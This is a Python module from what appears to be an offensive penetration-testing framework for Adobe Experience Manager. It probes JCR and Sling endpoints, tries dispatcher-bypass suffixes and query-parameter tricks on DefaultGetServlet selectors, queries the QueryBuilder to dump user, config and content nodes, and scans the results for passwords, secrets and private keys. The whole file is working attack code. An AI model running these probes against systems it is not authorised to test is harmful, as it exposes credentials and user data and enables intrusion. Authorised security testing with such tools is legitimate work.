"""JCR & Sling Resource Probing module for AEM Offensive Framework."""

import json
import re
from typing import List, Dict, Optional, Any
from dataclasses import dataclass

from core.models import Finding, VulnSeverity, ScanPhase, BypassTechnique
from core.config import AEMConfig
from core.engine import HTTPXEngine
from core.phases import PhaseResult
from bypass.transformers import BypassTransformer


@dataclass
class JCRNode:
    """Represents a JCR node."""
    path: str
    primary_type: str
    properties: Dict[str, Any]
    children: List[str]


class JCRProbingModule:
    """Advanced JCR and Sling resource probing."""
    
    # Critical paths for JCR exploration
    CRITICAL_PATHS = [
        "/content", "/etc", "/var", "/home", "/libs", "/apps",
        "/bin", "/tmp", "/conf", "/oak:index"
    ]
    
    # Sensitive property patterns
    SENSITIVE_PATTERNS = [
        (r"password", "Password field"),
        (r"secret", "Secret field"),
        (r"api[_-]?key", "API Key"),
        (r"private[_-]?key", "Private Key"),
        (r"credentials", "Credentials"),
        (r"jcr:uuid", "Node UUID"),
        (r"sling:resourceType", "Resource Type"),
        (r"cq:template", "Template Reference"),
    ]
    
    # Dangerous selectors
    DANGEROUS_SELECTORS = [
        ".infinity.json", ".tidy.infinity.json",
        ".1.json", ".2.json", ".-1.json", ".10.json",
        ".children.json", ".ext.json"
    ]
    
    def __init__(self, engine: HTTPXEngine, config: AEMConfig, bypass: BypassTransformer = None):
        self.engine = engine
        self.config = config
        self.bypass = bypass
        self.nodes_cache: Dict[str, JCRNode] = {}
    
    async def run(self, base_url: str) -> List[Finding]:
        """Run full JCR probing suite."""
        findings = []
        seen_urls: set = set()
        
        def _dedup_extend(new_findings):
            for f in new_findings:
                if f.url not in seen_urls:
                    seen_urls.add(f.url)
                    findings.append(f)
        
        # DefaultGetServlet enumeration (like aem_hacker) — tests root + key
        # paths with selectors AND bypass variants (suffix, query param)
        dgs_findings = await self._enumerate_default_get_servlet(base_url)
        _dedup_extend(dgs_findings)
        
        # Test dangerous selectors
        selector_findings = await self._test_selectors(base_url)
        _dedup_extend(selector_findings)
        
        # Probe critical paths
        for path in self.CRITICAL_PATHS:
            path_findings = await self._probe_path(base_url, path)
            _dedup_extend(path_findings)
        
        # Check for sensitive data exposure
        sensitive_findings = await self._check_sensitive_exposure(base_url)
        _dedup_extend(sensitive_findings)
        
        # QueryBuilder probe
        qb_findings = await self._probe_querybuilder(base_url)
        _dedup_extend(qb_findings)
        
        return findings
    
    def _get_bypass_enum(self, response) -> Optional[BypassTechnique]:
        """Convert response bypass string to BypassTechnique enum."""
        if response.bypass_used:
            try:
                return BypassTechnique(response.bypass_used)
            except ValueError:
                pass
        return None
    
    async def _enumerate_default_get_servlet(self, base_url: str) -> List[Finding]:
        """Enumerate DefaultGetServlet exposure with bypass variants.
        
        Mirrors aem_hacker's approach: for each base path + selector combo,
        test the direct URL AND all bypass variants (Sling suffix, query
        param extension).  Report every working variant as a separate finding
        because each represents a distinct dispatcher bypass.
        """
        findings = []
        seen_urls: set = set()
        
        # Paths to test (root is critical — aem_hacker always tests it)
        dgs_paths = [
            "/",
            "/content",
            "/content/dam",
            "/etc",
            "/etc/cloudservices",
            "/etc/replication",
            "/home/users",
            "/home/groups",
            "/var",
            "/libs",
            "/apps",
        ]
        
        # Selectors that expose DefaultGetServlet
        dgs_selectors = [
            ".json",
            ".children.json",
            ".1.json",
            ".infinity.json",
            ".tidy.json",
            ".ext.json",
        ]
        
        # Sling suffix bypasses (append after selector)
        suffix_bypasses = [
            ("/ck.css",   BypassTechnique.SLING_SUFFIX, "Sling suffix .css"),
            ("/ck.html",  BypassTechnique.SLING_SUFFIX, "Sling suffix .html"),
            ("/ck.png",   BypassTechnique.SLING_SUFFIX, "Sling suffix .png"),
            ("/ck.ico",   BypassTechnique.SLING_SUFFIX, "Sling suffix .ico"),
            ("/ck.js",    BypassTechnique.SLING_SUFFIX, "Sling suffix .js"),
            ("/ck.gif",   BypassTechnique.SLING_SUFFIX, "Sling suffix .gif"),
        ]
        
        # Query param bypasses (append after selector)
        query_bypasses = [
            ("?ck.css",  BypassTechnique.QUERY_EXTENSION, "Query param .css"),
            ("?ck.ico",  BypassTechnique.QUERY_EXTENSION, "Query param .ico"),
            ("?ck.png",  BypassTechnique.QUERY_EXTENSION, "Query param .png"),
            ("?ck.html", BypassTechnique.QUERY_EXTENSION, "Query param .html"),
        ]
        
        all_bypasses = suffix_bypasses + query_bypasses
        
        for path in dgs_paths:
            for selector in dgs_selectors:
                base_endpoint = f"{path}{selector}"
                
                # 1. Test direct access
                direct_url = f"{base_url}{base_endpoint}"
                if direct_url in seen_urls:
                    continue
                seen_urls.add(direct_url)
                
                direct_resp = await self.engine.get(direct_url)
                direct_works = (
                    direct_resp.status_code == 200
                    and not direct_resp.is_soft_404
                    and self._is_valid_dgs_response(direct_resp.text)
                )
                
                if direct_works:
                    findings.append(Finding(
                        phase=ScanPhase.DISCOVERY,
                        technique="DefaultGetServlet",
                        url=direct_url,
                        severity=self._dgs_severity(path, selector),
                        title=f"DefaultGetServlet: {base_endpoint}",
                        description=f"Sensitive information exposed via DefaultGetServlet at {base_endpoint}",
                        evidence={
                            "path": path,
                            "selector": selector,
                            "response_size": len(direct_resp.text),
                            "sample": direct_resp.text[:300],
                        },
                        chainable=True
                    ))
                
                # 2. Test bypass variants — even if direct works, report
                #    each working bypass because it proves the bypass technique
                #    defeats dispatcher rules
                for bypass_suffix, technique, desc in all_bypasses:
                    bypass_url = f"{base_url}{base_endpoint}{bypass_suffix}"
                    if bypass_url in seen_urls:
                        continue
                    seen_urls.add(bypass_url)
                    
                    resp = await self.engine.get(bypass_url)
                    
                    if (resp.status_code == 200
                            and not resp.is_soft_404
                            and self._is_valid_dgs_response(resp.text)):
                        findings.append(Finding(
                            phase=ScanPhase.DISCOVERY,
                            technique="DefaultGetServlet",
                            url=bypass_url,
                            severity=self._dgs_severity(path, selector),
                            title=f"DefaultGetServlet: {base_endpoint}{bypass_suffix}",
                            description=f"DefaultGetServlet exposed via {desc} at {base_endpoint}",
                            evidence={
                                "path": path,
                                "selector": selector,
                                "bypass": bypass_suffix,
                                "bypass_type": desc,
                                "response_size": len(resp.text),
                                "sample": resp.text[:300],
                            },
                            bypass_used=technique,
                            chainable=True
                        ))
        
        return findings
    
    def _is_valid_dgs_response(self, text: str) -> bool:
        """Check if response looks like actual DefaultGetServlet JSON output."""
        if not text or len(text) < 5:
            return False
        try:
            data = json.loads(text)
            if isinstance(data, dict):
                # Must have JCR/Sling/CQ properties or child nodes
                keys = set(data.keys())
                jcr_indicators = {
                    "jcr:primaryType", "jcr:mixinTypes", "jcr:createdBy",
                    "jcr:created", "sling:resourceType", "cq:template",
                    "cq:lastModified", "jcr:title", "jcr:description",
                }
                if keys & jcr_indicators:
                    return True
                # Also valid if it has child nodes (dict values that are dicts)
                if any(isinstance(v, dict) for v in data.values()):
                    return True
            elif isinstance(data, list) and len(data) > 0:
                return True
        except (json.JSONDecodeError, ValueError):
            pass
        return False
    
    def _dgs_severity(self, path: str, selector: str) -> VulnSeverity:
        """Assess severity of DefaultGetServlet exposure."""
        if "infinity" in selector:
            return VulnSeverity.CRITICAL
        if path in ("/home/users", "/home/groups", "/etc/replication", "/etc/cloudservices"):
            return VulnSeverity.HIGH
        if path in ("/", "/content", "/content/dam", "/etc"):
            return VulnSeverity.HIGH
        return VulnSeverity.MEDIUM
    
    async def _test_selectors(self, base_url: str) -> List[Finding]:
        """Test dangerous selectors on various paths."""
        findings = []
        test_paths = ["/content", "/etc", "/var", "/libs"]
        
        for path in test_paths:
            for selector in self.DANGEROUS_SELECTORS:
                url = f"{base_url}{path}{selector}"
                response = await self.engine.get(url)
                
                if response.status_code == 200 and not response.is_soft_404:
                    try:
                        data = json.loads(response.text)
                        
                        # Analyze content
                        node_count = self._count_nodes(data)
                        sensitive_props = self._find_sensitive_props(data)
                        
                        # Skip findings with 0 accessible nodes (not impactful)
                        if node_count == 0 and not sensitive_props:
                            continue
                        
                        # Calculate severity based on selector type and content
                        severity = VulnSeverity.MEDIUM
                        if "infinity" in selector:
                            severity = VulnSeverity.CRITICAL
                        elif selector in [".1.json", ".2.json"] and node_count > 0:
                            severity = VulnSeverity.HIGH
                        elif node_count == 0:
                            severity = VulnSeverity.LOW
                        
                        findings.append(Finding(
                            phase=ScanPhase.DISCOVERY,
                            technique="Dangerous Selector Exposure",
                            url=url,
                            severity=severity,
                            title=f"Accessible {selector} on {path}",
                            description=f"Path {path} exposes {selector} ({node_count} nodes accessible)",
                            evidence={
                                "selector": selector,
                                "node_count": node_count,
                                "sensitive_properties": sensitive_props[:10],
                                "sample_data": self._truncate_sample(data)
                            },
                            chainable=True
                        ))
                        
                        # Stop at first working selector per path
                        break
                        
                    except json.JSONDecodeError:
                        pass
        
        return findings
    
    async def _probe_path(self, base_url: str, path: str) -> List[Finding]:
        """Deep probe a specific JCR path."""
        findings = []
        
        # Try different content types
        variants = [
            f"{path}.json",
            f"{path}.1.json",
            f"{path}.2.json",
            f"{path}.txt",
            f"{path}.xml",
        ]
        
        for variant in variants:
            url = f"{base_url}{variant}"
            response = await self.engine.get(url)
            
            if response.status_code == 200 and not response.is_soft_404:
                content_type = response.headers.get("content-type", "")
                
                # Check for interesting content
                if self._is_interesting_response(response.text, content_type):
                    findings.append(Finding(
                        phase=ScanPhase.DISCOVERY,
                        technique="JCR Path Enumeration",
                        url=url,
                        severity=VulnSeverity.MEDIUM,
                        title=f"Accessible JCR Path: {path}",
                        description=f"Path {variant} returns valid content",
                        evidence={
                            "content_type": content_type,
                            "response_length": len(response.text),
                            "snippet": response.text[:500]
                        }
                    ))
        
        return findings
    
    async def _check_sensitive_exposure(self, base_url: str) -> List[Finding]:
        """Check for sensitive data exposure in JCR."""
        findings = []
        
        sensitive_paths = [
            "/etc/replication.json",
            "/etc/cloudservices.json",
            "/etc/segmentation.json",
            "/home/users.json",
            "/home/groups.json",
            "/var/audit.json",
        ]
        
        for path in sensitive_paths:
            url = f"{base_url}{path}"
            response = await self.engine.get(url)
            
            if response.status_code == 200 and not response.is_soft_404:
                try:
                    data = json.loads(response.text)
                    
                    # Check for sensitive content
                    sensitive_found = []
                    flat_data = self._flatten_dict(data)
                    
                    for pattern, desc in self.SENSITIVE_PATTERNS:
                        for key, value in flat_data.items():
                            if re.search(pattern, key, re.I):
                                sensitive_found.append({
                                    "pattern": desc,
                                    "key": key,
                                    "value": str(value)[:100]  # Truncate
                                })
                    
                    if sensitive_found:
                        findings.append(Finding(
                            phase=ScanPhase.DISCOVERY,
                            technique="Sensitive Data Exposure",
                            url=url,
                            severity=VulnSeverity.CRITICAL,
                            title=f"Sensitive Data in {path}",
                            description=f"Found {len(sensitive_found)} sensitive fields in {path}",
                            evidence={
                                "sensitive_fields": sensitive_found[:20],
                                "total_fields": len(flat_data)
                            },
                            chainable=True
                        ))
                    else:
                        findings.append(Finding(
                            phase=ScanPhase.DISCOVERY,
                            technique="Configuration Exposure",
                            url=url,
                            severity=VulnSeverity.HIGH,
                            title=f"Configuration Data Exposed: {path}",
                            description=f"{path} is accessible and contains configuration data",
                            evidence={"node_count": len(flat_data)}
                        ))
                        
                except json.JSONDecodeError:
                    pass
        
        return findings
    
    def _is_querybuilder_response(self, text: str) -> bool:
        """Check if response is actual QueryBuilder JSON (not login page)."""
        try:
            data = json.loads(text)
            # QueryBuilder responses have specific structure
            if isinstance(data, dict):
                # Must have hits array or success flag
                has_hits = "hits" in data and isinstance(data.get("hits"), list)
                has_success = data.get("success") == True
                has_total = "total" in data and isinstance(data.get("total"), int)
                has_results = "results" in data and isinstance(data.get("results"), int)
                
                if has_hits or has_success or has_total or has_results:
                    # Verify it's not an error/auth response
                    text_lower = text.lower()
                    auth_indicators = ["login", "sign in", "password", "j_password", "auth"]
                    if any(auth in text_lower for auth in auth_indicators):
                        return False
                    return True
        except json.JSONDecodeError:
            pass
        return False
    
    async def _probe_querybuilder(self, base_url: str) -> List[Finding]:
        """Probe QueryBuilder for information leakage."""
        findings = []
        qb_endpoint = f"{base_url}/bin/querybuilder.json"
        
        # Test basic querybuilder access
        basic_test = await self.engine.get(qb_endpoint)
        
        # Verify it's actual QueryBuilder response, not 200 OK with login page
        if basic_test.status_code == 200 and not basic_test.is_soft_404 and self._is_querybuilder_response(basic_test.text):
            findings.append(Finding(
                phase=ScanPhase.DISCOVERY,
                technique="QueryBuilder Exposure",
                url=qb_endpoint,
                severity=VulnSeverity.HIGH,
                title="QueryBuilder Endpoint Accessible",
                description="/bin/querybuilder.json is accessible without authentication",
                evidence={"status": basic_test.status_code, "sample": basic_test.text[:200]}
            ))
        
        # Try complex queries to extract information
        queries = [
            ("/bin/querybuilder.json?path=/content&p.limit=100&p.hits=full", "Content nodes"),
            ("/bin/querybuilder.json?path=/etc&p.limit=100&p.hits=full", "Config nodes"),
            ("/bin/querybuilder.json?path=/home&p.limit=100&p.hits=full", "User nodes"),
            ("/bin/querybuilder.json?path=/var&p.limit=100&type=nt:file", "Files in /var"),
        ]
        
        for query_url, desc in queries:
            url = f"{base_url}{query_url}"
            response = await self.engine.get(url)
            
            if response.status_code == 200 and not response.is_soft_404 and self._is_querybuilder_response(response.text):
                try:
                    data = json.loads(response.text)
                    hits = data.get("hits", [])
                    total = data.get("total", 0) or data.get("results", 0)
                    
                    # Only report if we actually got data back
                    if len(hits) > 0 or total > 0:
                        findings.append(Finding(
                            phase=ScanPhase.DISCOVERY,
                            technique="QueryBuilder Data Leak",
                            url=url,
                            severity=VulnSeverity.HIGH,
                            title=f"QueryBuilder Leaks {desc}",
                            description=f"QueryBuilder query returned {len(hits) or total} results for {desc}",
                            evidence={
                                "query": query_url,
                                "result_count": len(hits) or total,
                                "sample_results": hits[:5] if hits else []
                            },
                            chainable=True
                        ))
                except json.JSONDecodeError:
                    pass
        
        return findings
    
    def _count_nodes(self, data: Any, count: int = 0) -> int:
        """Recursively count nodes in JSON response."""
        if isinstance(data, dict):
            count += 1
            for value in data.values():
                count = self._count_nodes(value, count)
        elif isinstance(data, list):
            for item in data:
                count = self._count_nodes(item, count)
        return count
    
    def _find_sensitive_props(self, data: Any) -> List[str]:
        """Find sensitive property names in data."""
        sensitive = []
        flat = self._flatten_dict(data)
        
        for pattern, desc in self.SENSITIVE_PATTERNS:
            for key in flat.keys():
                if re.search(pattern, key, re.I):
                    sensitive.append(f"{desc}: {key}")
        
        return list(set(sensitive))
    
    def _flatten_dict(self, d: Any, parent_key: str = "", sep: str = ".") -> Dict[str, Any]:
        """Flatten nested dictionary."""
        items = {}
        if isinstance(d, dict):
            for k, v in d.items():
                new_key = f"{parent_key}{sep}{k}" if parent_key else k
                if isinstance(v, dict):
                    items.update(self._flatten_dict(v, new_key, sep))
                else:
                    items[new_key] = v
        return items
    
    def _truncate_sample(self, data: Any, max_size: int = 1000) -> Any:
        """Truncate sample data for evidence."""
        try:
            text = json.dumps(data)
            if len(text) > max_size:
                return text[:max_size] + "...[truncated]"
            return data
        except (TypeError, ValueError):
            return str(data)[:max_size]
    
    def _is_interesting_response(self, text: str, content_type: str) -> bool:
        """Check if response contains interesting content."""
        indicators = [
            "jcr:primaryType", "sling:", "cq:", "nt:",
            "items", "properties", "children"
        ]
        return any(ind in text for ind in indicators)
